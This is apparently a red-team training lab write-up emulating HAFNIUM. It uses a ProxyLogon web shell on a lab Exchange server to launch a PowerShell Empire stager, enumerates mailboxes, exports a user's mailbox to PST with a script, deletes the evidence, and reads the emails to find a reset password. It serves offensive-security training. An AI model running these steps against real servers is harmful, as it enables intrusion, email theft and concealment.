#### Tags: [[12 - Command and Control (TA0011)]] | [[Creating and Testing Payloads]]
## Objectives

    Scan the Microsoft Exchange server
    Use a web shell to interact with the mail server
    Execute an Empire stager on the mail server
    Export user emails
    Read user emails for target intelligence
### Scan Microsoft Exchange
```markdown
# Scan mail server
cd /labs/sec-3/initial-access/

curl https://raw.githubusercontent.com/GossiTheDog/scanning/main/http-vuln-exchange.nse -o http-vuln-exchange.nse

nmap --script http-vuln-exchange.nse mail.draconem.io
```
#### ProxyLogon
- ProxyLogon is the name for CVE-2021-26855 and CVE-2021-27065. CVE-2021-26855 is a vulnerability on Microsoft Exchange that allows authentication bypass. 
- CVE-2021-27065 is a post authentication file write vulnerability. When chained together, they allow remote code execution by allowing an adversary to bypass authentication and write a web shell to the server.
![[Pasted image 20240324024102.png]]
###### Red Team Tip: Only use web shells wiSth authentication, otherwise others could leverage your web shell.
- Note: Depending on client we can request White cell to allow us to simulate exploitation to avoid take down production servers.

### Launch [[Empire C2#Create an Empire listener]]
- Launch Empire and start an http listener on port 8080 for your tun0 interface. 

### Create [[Creating and Testing Payloads#*Payload * Create interactive HTTP Powershell Stager|Payload: Interactive HTTP Powershell Stager]]


### Interact with the Web Shell
- Navigate to URL to explore the webshell as it comes with a lot of functionality!
	- Password: `#$pwn3daspx#$h3ll` to authenticate to the web shell

![[Pasted image 20240324031111.png]]
#### Notes
- IIS Default Directory: `C:\Inetpub`
- Exchange Default Directory: `C:\Program _Files_\_Microsoft_\_Exchange Server_\V15\ClientAccess\Owa`
- Find a file via PowerShell `Get-ChildItem -Path 'C:\' -Recurse -Include 'rt-webshell-xcowe83.aspx' -File -Force`
- WebShell Path on Target system: `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\rt-webshell-xcowe83.aspx`
- ASPX WebShell on Private GitHub: [**AspxRevShell**](https://github.com/raghavtalwar/Arsenal/tree/main/AspxRevShell)
 
### Deploy Agent on mail.draconem.io
*Goal:* We want to get an agent/beacon on this Microsoft Exchange system in order to bring more tools and capability.
1. Click Cmd command in the top navigation window. 
2. Paste your PowerShell stager into Statements to spawn a new agent. 
3. Click carried out and check starkiller for a new agent.
**Remember:** The Statements field should start with `/c powershell -noP -sta -w 1 -enc ...`

![[Pasted image 20240324032203.png]]

![[Pasted image 20240324032430.png]]

### Enumerate Users
- *Goal:* Pick up target intelligence from user email
- The `Microsoft.Exchange.Management.Powershell.SnapIn` that will allow us use additional PowerShell functions and cmdlets that interact with Microsoft Exchange
```markdown
# Enumerate the users with mailboxes
powershell -c "Add-PSSnapIn Microsoft.Exchange.Management.Powershell.SnapIn; Get-Recipient | Format-Table -Auto Alias"
```
![[Pasted image 20240324033515.png]]
### Export User Emails
*Goal:* The PS script will leverage Exchange SnapIn, sets an output file and then exports the user's email to a PST file. 
- Create the file on Slingshot Linux at `/labs/sec-3/initial-access/export-email.ps1`
- Note: These commands need to run as a script because there are some inconsistencies with stating UNC paths
```powershell
function Export-Email {
    param (
        $User
    )
    Add-PSSnapIn Microsoft.Exchange.Management.Powershell.SnapIn;
    $OutFile = "\\127.0.0.1\c$\ProgramData\" + $User + ".pst";
    New-MailboxExportRequest -Mailbox $User -FilePath $OutFile;
};
```
We will invoke this script with an Empire module called *invoke_script*. 
- Interact with your agent, select `powershell/management/invoke_script` from the Execute Module drop down list.
- Then enter the following values:

	    ScriptCmd: Export-Email Mark.Goodwin
	    ScriptPath: /labs/sec-3/initial-access/export-email.ps1

![[Pasted image 20240324033656.png]]

- There are many ways to complete a task but these commands mimic the same techniques used by HAFNIUM, the adversary we are emulating.

![[Pasted image 20240324035153.png]]
### Read User Emails
1. Download the exported mailbox by clicking the down arrow icon in the upper right of the agent screen. 
2. The file should be located at `c:\ProgramData\Mark.Goodwin.pst` 
3. After downloading the file delete it off the mail server by issuing this shell command `del c:\ProgramData\Mark.Goodwin.pst`
```markdown
#### Example the PST using readpst
## Find the PST file in our Agent download directory & Copy it
cd /labs/sec-3/initial-access/

find /opt/Empire/empire/server/downloads/ | grep pst

cp /opt/Empire/empire/server/downloads/agent Name/C:/ProgramData/Mark.Goodwin.pst .

readpst -S -o . Mark.Goodwin.pst
```
![[Pasted image 20240324035812.png]]
```markdown
#### readpst has extracted all the emails from the pst file to plain text
## We can now read through them for target intelligence
ll Mark.Goodwin/Inbox/

strings Mark.Goodwin/Inbox/1
```
![[Pasted image 20240324040015.png]]
We just found that Mark Goodwin's password has been reset to `C@v3t3Dr@c0n3m!!`
#### Bonus
- Continue to read through the mailboxes of other users to find additional target intelligence.
## Conclusion
- In this lab we used a web shell that was placed on the Microsoft Exchange server to deploy an agent.
- Once we had positive control of our agent in target space we established our initial access. We were fortunate that our agent is running as SYSTEM and has unfettered access to the system. 
- We then enumerated users and exported a mailbox to read through emails. In those emails we found that the user `Mark.Goodwin` had their password reset to `C@v3t3Dr@c0n3m!!`. 
- We will use this information for later labs. Leave your agent running for the next lab.